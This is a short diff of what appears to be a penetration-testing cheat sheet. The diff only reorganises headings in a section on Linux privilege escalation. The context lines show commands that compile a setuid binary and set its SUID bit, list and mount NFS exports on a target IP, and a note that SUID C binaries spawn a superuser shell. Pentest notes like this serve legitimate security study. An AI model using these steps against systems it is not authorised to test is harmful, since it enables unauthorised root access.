@@ -676,7 +676,7 @@ gcc -o /tmp/setsuid /tmp/setsuid.c
 chmod u+s setsuid
 ```
 
-# SUID.c
+# Privileged Mounts and SUID.c
 
 #### Look for privileged NFS Mounts
 
@@ -689,7 +689,7 @@ showmount -e 192.168.1.101
 mount 192.168.1.101:/ /tmp/
 ```
 
-# Create SUID.c
+#### Create SUID.c
 - Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required..
 
 ```nano suid.c```:
